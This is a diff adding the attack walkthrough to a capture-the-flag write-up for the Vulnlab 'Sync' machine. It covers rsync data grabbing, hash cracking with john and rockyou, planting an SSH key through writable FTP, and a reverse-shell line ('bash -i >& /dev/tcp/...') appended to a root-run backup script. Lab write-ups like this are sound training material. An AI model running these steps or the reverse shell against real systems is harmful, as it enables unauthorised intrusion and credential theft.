@@ -12,7 +12,13 @@ tags: [linux, easy, rsync]
 * Difficulty: Easy
 
 # tl;dr
-<details><summary>Spoilers</summary>
+<details><summary>Spoilers</summary>i
+* Use rsync to grab a copy of the website, including a DB with user hashes
+* crack one of the hashes with rockyou
+* enumerate FTP with the acquired creds. Hint: you are in a home directory and can write folders/files
+* SSH into the $target and enumerate other users and interesting directories at the root folder level
+* get the contents of a file and unshadow them to crack on your $attacker
+* switch to a new user with the cracked hash retrieved and then add a revshell to the script found in a process tied to the current user to get root revshell
 </details>
 
 # Attack Path
@@ -176,8 +182,13 @@ Got *triss:gerald*
 
 ![Triss webserver login](/assets/img/ctf/vulnlab/easy/sync/8.png)
 
+Enumerating the FTP share reveals this is a home directory (most likely triss').
+
+With that in mind, I verified write access by uploading *test.txt*. It worked, implying I could create and upload a SSH .pub key to authorized keys for SSH access:
+
 ```bash
 ftp> ls -alh
+
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 drwxr-x---    2 1003     1003         4096 Nov 11 05:46 .
@@ -187,7 +198,21 @@ lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/nu
 -rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc
 -rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile
 -rw-------    1 1003     1003            5 Nov 11 05:46 test.txt
+```
 
+```bash
+┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
+└─$ ssh-keygen -f triss 
+Generating public/private ed25519 key pair.
+...
+Your identification has been saved in triss
+Your public key has been saved in triss.pub
+
+┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
+└─$ mv triss.pub authorized_keys
+```
+
+```bash 
 ftp> mkdir .ssh
 257 "/.ssh" created
 
@@ -199,27 +224,107 @@ ftp> put authorized_key
 226 Transfer complete. 
 ```
 
+## Lateral Movement / Privilege Escalation
+
+Initial foothold recon. Found two new users, *sa* and *jennifer*.
+
 ```bash
 ┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
 └─$ ssh -i triss triss@$sync 
-...
-triss@ip-10-10-200-238:~$
-```
 
-```bash
+triss@ip-10-10-200-238:~$
+
 triss@ip-10-10-200-238:~$ ls /home 
 httpd  jennifer  sa  triss  ubuntu
 ```
 
-## Lateral Movement / Privilege Escalation
+linPEAS mentioned this SGID. Couldn't find anything to do with it.
 
 ```text
  /usr/bin/write.ul (Unknown SGID binary) 
 ```
 
+linPEAS did show something else of note: a root-level folder */backup*
+
+![/backup at root](/assets/img/ctf/vulnlab/easy/sync/backup_in_root.png)
+
+Using *pspy* I found a backup process that was sending zip files to this folder.
+
+![/backup at root process](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_2.png)
+
+The file is owned by user *sa*
+
+![/backup at root file contents](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_3.png)
+
+Zipped files:
+
+![/backup at root zipped files](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_4.png)
+
+I unzipped one and saw that the contents included a copy of *passwd* and *shadow*. 
+
+![/backup at root zip contents](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_5.png)
+
+That means we can likely unshadow and try to crack the hashes on $attacker.
+
+![/backup at root](/assets/img/ctf/vulnlab/easy/sync/backup_in_root.png)
+
+I copied the two files to triss' home directory to transfer to $attacker via FTP:
+
+![/backup at root passwd and shadow to FTP](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_6.png)
+
+![/backup at root passwd and shadow to FTP 2](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_7.png)
+
 ## Root / SYSTEM
 
+Then I attempted to unshadow the passwd file and store the hashes in hashes.unshadowed:
+
+```bash
+┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
+└─$ unshadow passwd shadow > hashes.unshadowed
+```
+
+![unshadowed](/assets/img/ctf/vulnlab/easy/sync/backup_in_root_8.png)
+
+Then cracked with *john*
+
+```bash
+┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
+└─$ sudo john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.unshadowed 
+
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 6 OpenMP threads                             
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+sakura           (sa)                                 
+gerald           (jennifer)     
+gerald           (triss)     
+```
+
+I got passwords for *sa* and *jennifer*. Back on my SSH session with *triss*, I switched user to *sa* and added a revshell command to the *backup.sh* script found earlier:
+
+```bash
+triss@ip-10-10-200-238:~/tmp/backup$ su sa
+Password: 
+
+sa@ip-10-10-200-238:/home/triss/tmp/backup$ echo "bash -i >& /dev/tcp/10.8.7.193/4444 0>&1" >> /usr/local/bin/backup.sh                                                                                                
+
+sa@ip-10-10-200-238:/home/triss/tmp/backup$ Connection to 10.10.95.76 closed by remote host.
+Connection to 10.10.95.76 closed.
+```
+Then I got a root revshell and pwned Sync:
+
+![root](/assets/img/ctf/vulnlab/easy/sync/root.png)
+
+
 # Lessons Learned
-
-<iframe style="width:100% !important;"  src="https://docs.google.com/spreadsheets/d/e/2PACX-1vTDFNm5WpGz8o9JSi4bYV5Rp34cSlnKC-pAJzThoQnm1pJsPQp2A_ez8BdokErrGYBt2bos8YAh9AsD/pubhtml?gid=219339819&amp;single=true&amp;widget=true&amp;headers=false"></iframe>
-
+* rsync can be used to download files (and upload, if allowed)
+* when cracking hashes, don't get impatient. Let the list exhaust even if it takes forever (rockyou).
+* If you can examine the source code of a site, look for how the hash is calculated to create custom rules for hashcat.
+* FTP dirs can be enumerated with ls -alh, not just dir.
+* replace/create authorized_keys with a .pub key if you can write to a /home dir
+* odd looking folders at the $target / root directory should be investigated (e.g. /backups)
+* use pspy to examine processes that may be involved in those files. Check for SUID/SGID as root to edit those files with a revshell
+* use *john* to unshadow captured passwd files if we also have the shadow
